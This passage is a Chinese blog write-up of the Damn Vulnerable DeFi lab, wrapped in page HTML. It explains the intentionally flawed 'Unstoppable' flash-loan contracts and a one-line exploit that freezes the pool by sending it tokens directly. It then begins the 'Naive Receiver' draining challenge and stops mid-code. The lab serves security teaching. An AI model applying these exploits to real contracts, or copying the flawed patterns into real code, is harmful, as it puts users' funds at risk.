@@ -1,0 +1,554 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.2">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="DamnVulnerableDeFi">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DamnVulnerableDeFi靶场实战(1-5)">
+<meta property="og:url" content="http://example.com/2022/12/01/DamnVulnerableDeFi%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98-1-5/index.html">
+<meta property="og:site_name" content="lucifer&#39;s blog">
+<meta property="og:description" content="DamnVulnerableDeFi">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/b99f5470ec484de2a66f4cd1a5efaea3.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/b772dbde06dd4635bd9d42e87c37f564.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/910ae342cb5b41858c6c9d3a41932f7d.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/5b8c3f5b2e584a338c33e073168e6dbb.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/46c5ebf1a2bd4994ad43f6b8696489ec.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/0382e08d10dc44ca94bba3947ec9e8c6.png">
+<meta property="article:published_time" content="2022-12-01T06:32:33.000Z">
+<meta property="article:modified_time" content="2022-12-01T07:10:29.245Z">
+<meta property="article:author" content="lucifer">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/b99f5470ec484de2a66f4cd1a5efaea3.png">
+
+<link rel="canonical" href="http://example.com/2022/12/01/DamnVulnerableDeFi%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98-1-5/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>DamnVulnerableDeFi靶场实战(1-5) | lucifer's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">lucifer's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-schedule">
+
+    <a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>日程表</a>
+
+  </li>
+        <li class="menu-item menu-item-resources">
+
+    <a href="/resources/" rel="section"><i class="download fa-fw"></i>资源</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/12/01/DamnVulnerableDeFi%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98-1-5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="lucifer">
+      <meta itemprop="description" content="我的老婆严菡是猪">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="lucifer's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          DamnVulnerableDeFi靶场实战(1-5)
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-12-01 14:32:33 / 修改时间：15:10:29" itemprop="dateCreated datePublished" datetime="2022-12-01T14:32:33+08:00">2022-12-01</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/DamnVulnerableDeFi/" itemprop="url" rel="index"><span itemprop="name">DamnVulnerableDeFi</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>21k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>19 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>DamnVulnerableDeFi<br> <span id="more"></span><br>@<a href="%E9%A2%98%E7%9B%AE%E9%A2%84%E8%A7%88">TOC</a></p>
+<h1 id="Unstoppable"><a href="#Unstoppable" class="headerlink" title="Unstoppable"></a>Unstoppable</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>题目要求：</p>
+<blockquote>
+<p>There’s a lending pool with a million DVT tokens in balance, offering<br>flash loans for free.</p>
+<p>If only there was a way to attack and stop the pool from offering<br>flash loans …</p>
+<p>You start with 100 DVT tokens in balance.</p>
+</blockquote>
+<p>题目给了一个闪电贷合约，要求我们停止这个闪电贷合约继续运行。<br>闪电贷合约：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line"></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts/token/ERC20/IERC20.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts/security/ReentrancyGuard.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line">interface <span class="title class_">IReceiver</span> &#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">receiveTokens</span>(<span class="params">address tokenAddress, uint256 amount</span>) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@title</span> <span class="variable">UnstoppableLender</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">contract <span class="title class_">UnstoppableLender</span> is <span class="title class_">ReentrancyGuard</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">IERC20</span> public immutable damnValuableToken;</span><br><span class="line">    uint256 public poolBalance;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">address tokenAddress</span>) &#123;</span><br><span class="line">        <span class="built_in">require</span>(tokenAddress != <span class="title function_">address</span>(<span class="number">0</span>), <span class="string">&quot;Token address cannot be zero&quot;</span>);</span><br><span class="line">        damnValuableToken = <span class="title class_">IERC20</span>(tokenAddress);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">depositTokens</span>(<span class="params">uint256 amount</span>) external nonReentrant &#123;</span><br><span class="line">        <span class="built_in">require</span>(amount &gt; <span class="number">0</span>, <span class="string">&quot;Must deposit at least one token&quot;</span>);</span><br><span class="line">        <span class="comment">// Transfer token from sender. Sender must have first approved them.</span></span><br><span class="line">        damnValuableToken.<span class="title function_">transferFrom</span>(msg.<span class="property">sender</span>, <span class="title function_">address</span>(<span class="variable language_">this</span>), amount);</span><br><span class="line">        poolBalance = poolBalance + amount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">flashLoan</span>(<span class="params">uint256 borrowAmount</span>) external nonReentrant &#123;</span><br><span class="line">        <span class="built_in">require</span>(borrowAmount &gt; <span class="number">0</span>, <span class="string">&quot;Must borrow at least one token&quot;</span>);</span><br><span class="line"></span><br><span class="line">        uint256 balanceBefore = damnValuableToken.<span class="title function_">balanceOf</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>));</span><br><span class="line">        <span class="built_in">require</span>(balanceBefore &gt;= borrowAmount, <span class="string">&quot;Not enough tokens in pool&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Ensured by the protocol via the `depositTokens` function</span></span><br><span class="line">        <span class="title function_">assert</span>(poolBalance == balanceBefore);</span><br><span class="line">        </span><br><span class="line">        damnValuableToken.<span class="title function_">transfer</span>(msg.<span class="property">sender</span>, borrowAmount);</span><br><span class="line">        </span><br><span class="line">        <span class="title class_">IReceiver</span>(msg.<span class="property">sender</span>).<span class="title function_">receiveTokens</span>(<span class="title function_">address</span>(damnValuableToken), borrowAmount);</span><br><span class="line">        </span><br><span class="line">        uint256 balanceAfter = damnValuableToken.<span class="title function_">balanceOf</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>));</span><br><span class="line">        <span class="built_in">require</span>(balanceAfter &gt;= balanceBefore, <span class="string">&quot;Flash loan hasn&#x27;t been paid back&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>合约拥有两个函数，并使用了名为“DVT”的ERC20代币。<br>DVT代币合约：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line"></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts/token/ERC20/ERC20.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@title</span> <span class="variable">DamnValuableToken</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">contract <span class="title class_">DamnValuableToken</span> is <span class="title class_">ERC20</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Decimals are set to 18 by default in `ERC20`</span></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params"></span>) <span class="title class_">ERC20</span>(<span class="string">&quot;DamnValuableToken&quot;</span>, <span class="string">&quot;DVT&quot;</span>) &#123;</span><br><span class="line">        <span class="title function_">_mint</span>(msg.<span class="property">sender</span>, <span class="title function_">type</span>(uint256).<span class="property">max</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>合约创造之初就给了创造者最多的代币，而我们需要让这些代币失效，也就是不能进行使用。</p>
+<p>UnstoppableLender.sol合约中定义了两个函数，depositTokens和flashloan，前者用来向合约增加代币，后者则是闪电贷函数，其中又限定了调用者满足IReceiver接口，因此借贷者也应该是一个合约，题目也给出了借贷者的合约。</p>
+<p>借贷者合约：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line"></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;../unstoppable/UnstoppableLender.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts/token/ERC20/IERC20.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@title</span> <span class="variable">ReceiverUnstoppable</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">contract <span class="title class_">ReceiverUnstoppable</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">UnstoppableLender</span> private immutable pool;</span><br><span class="line">    address private immutable owner;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">address poolAddress</span>) &#123;</span><br><span class="line">        pool = <span class="title class_">UnstoppableLender</span>(poolAddress);</span><br><span class="line">        owner = msg.<span class="property">sender</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Pool will call this function during the flash loan</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">receiveTokens</span>(<span class="params">address tokenAddress, uint256 amount</span>) external &#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">sender</span> == <span class="title function_">address</span>(pool), <span class="string">&quot;Sender must be pool&quot;</span>);</span><br><span class="line">        <span class="comment">// Return all tokens to the pool</span></span><br><span class="line">        <span class="built_in">require</span>(<span class="title class_">IERC20</span>(tokenAddress).<span class="title function_">transfer</span>(msg.<span class="property">sender</span>, amount), <span class="string">&quot;Transfer of tokens failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">executeFlashLoan</span>(<span class="params">uint256 amount</span>) external &#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">sender</span> == owner, <span class="string">&quot;Only owner can execute flash loan&quot;</span>);</span><br><span class="line">        pool.<span class="title function_">flashLoan</span>(amount);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>该合约只有两个函数，一个函数用来将借到的通证返还给闪电贷合约，另一个函数用来向闪电贷合约借通证，并限制借贷者只能是owner。<br>我们来分析一下闪电贷合约中的几个限制条件的含义分别是什么。</p>
+<ul>
+<li><code>require(borrowAmount &gt; 0, &quot;Must borrow at least one token&quot;);</code>此项防止无意义的借贷，确保每次运行确实进行借贷了</li>
+<li><code>require(balanceBefore &gt;= borrowAmount, &quot;Not enough tokens in pool&quot;);</code>此项是确保有足够的通证余额进行借贷</li>
+<li><code>assert(poolBalance == balanceBefore);</code>此项是为了保证合约中现在的通证，与之前的通证相同</li>
+<li><code>require(balanceAfter &gt;= balanceBefore, &quot;Flash loan hasn&#39;t been paid back&quot;);</code>此项是为了确保借贷者合约将通证进行了返还</li>
+</ul>
+<p> 我们注意到函数中的第三个限制条件，balanceBefore是合约现在的余额，而poolBalance是合约之间的余额，并且这个变量只在depositToken中进行了修改，但是我们并不仅仅只有这一种方法为合约增加通证，我们从这一点切入进行攻击。</p>
+<h2 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h2><p>攻击代码：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">it</span>(<span class="string">&#x27;Exploit&#x27;</span>, <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="comment">/** CODE YOUR EXPLOIT HERE */</span></span><br><span class="line">            <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">token</span>.<span class="title function_">transfer</span>(<span class="variable language_">this</span>.<span class="property">pool</span>.<span class="property">address</span>,<span class="number">1</span>)</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure>
+<p>我们仅仅是在攻击区域增加了 await this.token.transfer(this.pool.address,1)，为合约发送了一个DVT通证，这时合约的poolBalance并没有发生变化，但余额其实增加了1DVT，所以一旦想要再次借贷，poolBalance和balanceBefore并不相等，无法正常借贷。<br><img src="https://img-blog.csdnimg.cn/b99f5470ec484de2a66f4cd1a5efaea3.png" alt="在这里插入图片描述"><br>攻击完成</p>
+<h1 id="Naive-Receiver"><a href="#Naive-Receiver" class="headerlink" title="Naive Receiver"></a>Naive Receiver</h1><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p>题目要求：</p>
+<blockquote>
+<p>There’s a lending pool offering quite expensive flash loans of Ether,<br>which has 1000 ETH in balance.</p>
+<p>You also see that a user has deployed a contract with 10 ETH in<br>balance, capable of interacting with the lending pool and receiveing<br>flash loans of ETH.</p>
+<p>Drain all ETH funds from the user’s contract. Doing it in a single<br>transaction is a big plus</p>
+</blockquote>
+<p>大意就是有一个高利贷的闪电贷合约，借贷池中有一千个eth，而用户拥有十个eth，我们要做的就是将用户的这十个ETH掏空。让我们来看看合约<br>闪电贷合约：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts/security/ReentrancyGuard.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts/utils/Address.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@title</span> <span class="variable">NaiveReceiverLenderPool</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">contract <span class="title class_">NaiveReceiverLenderPool</span> is <span class="title class_">ReentrancyGuard</span> &#123;</span><br><span class="line"></span><br><span class="line">    using <span class="title class_">Address</span> <span class="keyword">for</span> address;</span><br><span class="line"></span><br><span class="line">    uint256 private constant <span class="variable constant_">FIXED_FEE</span> = <span class="number">1</span> ether; <span class="comment">// not the cheapest flash loan</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">fixedFee</span>(<span class="params"></span>) external pure returns (uint256) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable constant_">FIXED_FEE</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">flashLoan</span>(<span class="params">address borrower, uint256 borrowAmount</span>) external nonReentrant &#123;</span><br><span class="line"></span><br><span class="line">        uint256 balanceBefore = <span class="title function_">address</span>(<span class="variable language_">this</span>).<span class="property">balance</span>;</span><br><span class="line">        <span class="built_in">require</span>(balanceBefore &gt;= borrowAmount, <span class="string">&quot;Not enough ETH in pool&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="built_in">require</span>(borrower.<span class="title function_">isContract</span>(), <span class="string">&quot;Borrower must be a deployed contract&quot;</span>);</span><br><span class="line">        <span class="comment">// Transfer ETH and handle control to receiver</span></span><br><span class="line">        borrower.<span class="title function_">functionCallWithValue</span>(</span><br><span class="line">            abi.<span class="title function_">encodeWithSignature</span>(</span><br><span class="line">                <span class="string">&quot;receiveEther(uint256)&quot;</span>,</span><br><span class="line">                <span class="variable constant_">FIXED_FEE</span></span><br><span class="line">            ),</span><br><span class="line">            borrowAmount</span><br><span class="line">        );</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">require</span>(</span><br><span class="line">            <span class="title function_">address</span>(<span class="variable language_">this</span>).<span class="property">balance</span> &gt;= balanceBefore + <span class="variable constant_">FIXED_FEE</span>,</span><br><span class="line">            <span class="string">&quot;Flash loan hasn&#x27;t been paid back&quot;</span></span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Allow deposits of ETH</span></span><br><span class="line">    receive () external payable &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>用户合约：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line"></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts/utils/Address.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@title</span> <span class="variable">FlashLoanReceiver</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">contract <span class="title class_">FlashLoanReceiver</span> &#123;</span><br><span class="line">    using <span class="title class_">Address</span> <span class="keyword">for</span> address payable;</span><br><span class="line"></span><br><span class="line">    address payable private pool;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">address payable poolAddress</span>) &#123;</span><br><span class="line">        pool = poolAddress;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Function called by the pool during flash loan</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">receiveEther</span>(<span class="params">uint256 fee</span>) public payable &#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">sender</span> == pool, <span class="string">&quot;Sender must be pool&quot;</span>);</span><br><span class="line"></span><br><span class="line">        uint256 amountToBeRepaid = msg.<span class="property">value</span> + fee;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">require</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>).<span class="property">balance</span> &gt;= amountToBeRepaid, <span class="string">&quot;Cannot borrow that much&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="title function_">_executeActionDuringFlashLoan</span>();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// Return funds to pool</span></span><br><span class="line">        pool.<span class="title function_">sendValue</span>(amountToBeRepaid);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Internal function where the funds received are used</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">_executeActionDuringFlashLoan</span>(<span class="params"></span>) internal &#123; &#125;</span><br><span 